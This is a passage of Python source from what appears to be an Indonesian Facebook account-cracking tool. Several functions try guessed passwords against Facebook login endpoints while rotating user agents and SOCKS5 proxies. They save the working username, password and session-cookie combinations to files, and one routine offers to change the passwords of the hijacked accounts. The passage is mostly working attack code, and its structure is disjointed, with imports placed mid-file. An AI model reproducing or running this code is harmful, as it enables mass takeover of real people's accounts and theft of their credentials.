			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r{U}[{P}☕{U}] {P}USER   : {h}{idf} {P}<=>{tahun(idf)}\n\r{U}[{P}☕{U}] {P}PASS   : {h}{pw}\n\r{U}[{P}☕{U}] {P}COKI   : {h}{kuki}\n') 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				#cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ METODE LAWAK V1]--------------------#
def cracklawakv1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen) 
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}iphone.facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link=ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': idf, 
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': 'header',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true', 
'had_password_prefilled': 'true', 
'is_smart_lock': 'false', 
'bi_xrwh': 0
}
			heade ={'Host':'iphone.facebook.com','x-fb-rlafr': '0','access-control-allow-origin':'*','strict-transport-security':'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug':'6kPPqq1tVlNAOQKlMbyQJKyIsCy+xVvedl1dnfzMw+SSrLi3buNNbTwQ+EKhqari1Co/wiELTB87WFOow+VCZw==','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="113", "Not=A?Brand";v="99","Google Chrome";v="113"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://iphone.facebook.com','content-type': 'application/x-javascript; charset=utf-8','user-agent': ua,'accept':'*/*','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer':'https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9','accept-encoding': 'gzip, deflate,br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://iphone.facebook.com/login/device-based/login/async/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&refsrc=deprecated&lwv=101',data=data,headers=heade)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				tree.add(f"[bold green]{idf}|{pw}")
				tree.add(f"[bold green]{kuki}")
				tree.add(f"[bold green]{ua}\n")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ METHOD LAWAK V2 ]--------------------#
def cracklawakv2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	#ua = useragent()
	ua = random.choice(ugen) 
	ses = requests.Session()
	prog.update(des,description=f"{h}Lawak V2{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=2572246932852997&kid_directed_site=0&app_id=2572246932852997&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2572246932852997%26cbt%3D1680997745004%26e2e%3D%257B%2522init%2522%253A1680997745004%257D%26ies%3D1%26sdk%3Dandroid-11.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bc5a75ae-2b5b-4472-a65e-f9c2358a25e7%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522i9u2k7fe0ha0ss8moro8%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.pure.indosat.care%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbc5a75ae-2b5b-4472-a65e-f9c2358a25e7%26tp%3Dunspecified%26refsrc%3Ddeprecated%26__req%3D9%26_rdr&cancel_url=fbconnect%3A%2F%2Fcct.com.pure.indosat.care%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bc5a75ae-2b5b-4472-a65e-f9c2358a25e7%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522i9u2k7fe0ha0ss8moro8%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': f'{idf} {pw}', 
'prefill_source': 'provided_or_soft_matched',
'prefill_type': 'contact_point',
'first_prefill_source': 'provided_or_soft_matched',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': True, 
'had_password_prefilled': False, 
'is_smart_lock': False, 
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1)
}
			heade = {
'Host':'m.facebook.com',
'x-fb-rlafr': '0',
'access-control-allow-origin': '*',
'pragma': 'no-cache',
'cache-control': 'private, no-cache, no-store, must-revalidate',
'x-fb-debug':'Ar808puA9haE5G4ec9zVAcFGinnes6bGoqixLonN/y5Q6rn9EcYoI4u3yLxGxJDpKRXuHAOiLuDHUPAeSTdPtg==',
'content-length':f"{len(str(data))}",
'cache-control': 'max-age=0',
'save-data': 'on',
'upgrade-insecure-requests':'1',
'strict-transport-security':'max-age=15552000; preload',
'sec-ch-ua':'"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
'sec-ch-ua-mobile':'?0',
'user-agent':ua,
'content-type':'application/x-www-form-urlencoded',
'sec-ch-ua-platform': '"Android"',
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'origin': 'https://m.facebook.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer':'https://m.facebook.com/v11.0/dialog/oauth?cct_prefetching=0&client_id=2572246932852997&cbt=1680997745004&e2e=%7B%22init%22%3A1680997745004%7D&ies=1&sdk=android-11.3.0&sso=chrome_custom_tab&scope=public_profile&state=%7B%220_auth_logger_id%22%3A%22bc5a75ae-2b5b-4472-a65e-f9c2358a25e7%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22i9u2k7fe0ha0ss8moro8%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.pure.indosat.care&auth_type=rerequest&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&ret=login&fbapp_pres=0&logger_id=bc5a75ae-2b5b-4472-a65e-f9c2358a25e7&tp=unspecified&refsrc=deprecated&__req=9&_rdr',
'accept-encoding':'gzip, deflate',
'accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'
}
			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?api_key=2572246932852997&amp;auth_token=b10a270eda3984411307133724f5523e&amp;skip_api_login=1&amp;signed_next=1&amp;next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2572246932852997%26cbt%3D1680997745004%26e2e%3D%257B%2522init%2522%253A1680997745004%257D%26ies%3D1%26sdk%3Dandroid-11.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bc5a75ae-2b5b-4472-a65e-f9c2358a25e7%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522i9u2k7fe0ha0ss8moro8%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.pure.indosat.care%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbc5a75ae-2b5b-4472-a65e-f9c2358a25e7%26tp%3Dunspecified%26refsrc%3Ddeprecated%26__req%3D9%26_rdr&amp;refsrc=deprecated&amp;app_id=2572246932852997&amp;cancel=fbconnect%3A%2F%2Fcct.com.pure.indosat.care%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bc5a75ae-2b5b-4472-a65e-f9c2358a25e7%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522i9u2k7fe0ha0ss8moro8%2522%257D&amp;lwv=100&amp;locale2=id_ID&amp;refid=9',data=data,headers=heade,allow_redirects=True) 
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				tree.add(f"[bold green]{idf}|{pw}")
				tree.add(f"[bold green]{kuki}")
				tree.add(f"[bold green]{ua}\n")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def crack1(idf,pwv,awal):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	#ua = useragent()
	#ua = random.choice(ugen2)
	ses = requests.Session()
	ahir = str(datetime.now()-awal).split('.')[0]
	prog.update(des,description=f"[bold white][[bold yellow]{ahir}[bold white]]-[[bold white]{loop}[bold yellow]/[bold white]{len(id)}[bold white]]-[[bold green]OK-:[bold green]{ok}[/] {k}CP-:[bold yellow]{cp}[bold white]][/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			#gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
			ua = random.choice(ugen) 
			data = {"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16", "sdk_version": {random.randint(1,26)}, "email": idf, "locale": "en_US", "password": pw, "sdk": "android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
			head = {"Host": "graph.facebook.com", "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			xnxx = ses.post("https://graph.facebook.com/auth/login", params=data, headers=head, allow_redirects=False).json() 
			#anjg = json.loads(xnxx.text)
			#cuaks=(f'{idf}|{pw)
			if "session_key" in xnxx:
				cokz = ";".join(i["name"]+"="+i["value"] for i in xnxx["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				coki = f"sb={ssbb};{cokz}"
				print('\r\r\033[1;32m [OK] %s | %s'%(idf,pw))
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				oks.append(idf+'|'+pw)
				break
			elif "www.facebook.com" in xnxx["error"]["message"]:
				print('\r\r\x1b[38;5;208m [CP] '+idf+' | '+pw+'\033[1;97m')
				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
				cps.append(idf+'|'+pw)
				break
			elif "Calls to this api have exceeded the rate limit. (613)" in xnxx:
				prog.update(des,description=f"[bold white][[bold yellow]{ahir}[bold white]]-[[bold white]{loop}[bold yellow]/[bold white]{len(id)}[bold white]]-[[bold green]OK-:[bold green]{ok}[/] {k}CP-:[bold yellow]{cp}[bold white]][/]")
				prog.advence(des) 
				time.sleep(5) 
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1725 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.3'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1

#-----------------------[ DEF CEK OPSI ]--------------------#
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m ╰─  "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	print ("%s%s%s%s\033[0m\033[0mPilih Hasil Crack Yg Tersimpan Untuk Cek Opsi %s\n"%(U,til,O,U,O))
	for file in dirs:
		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\033[0mMasukan file [ CTH%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s%s\033[0mFile Tidak Ada'%(M,til))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s\033[0mNama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s\033[0Misi Yang Benar "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s\033[0mnama file %s\033[0m tidak tersedia"%(M,til,romi))
	jalan("%s%s%s\033[0mMode Pesawatkan Terlebih Dahulu 5 Detik "%(U,til,O))
	pw=input("\n%s%s%s\033[0mUbah Sandi Pada Akun One Tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s\033[0mMasukan Sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s%s Sandi Minimal 6 Karakter "%(M,til))
		else:
			pwbaru.append(pw2)
	print ("%s%s%s\033[0mTotal Akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s\033[0mLogin Akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s\033[0mSelesai Mengecek Akun"%(U,til,O));jeda(0.07)
	input('%s%s%s[%s Enter%s ]'%(U,til,O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(idf,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua="Mozilla/5.0 (Linux; Android 7.1.1; CPH1725 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]"
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://free.cinyourrc.facebook.com/","user-agent": ua})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":idf,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m Akun Terkunci Sesi New"%(M,til))
		else:
			print("\r%s%s\033[0m Akun Tidak Checkpoint, Silahkan Anda Login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (idf,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
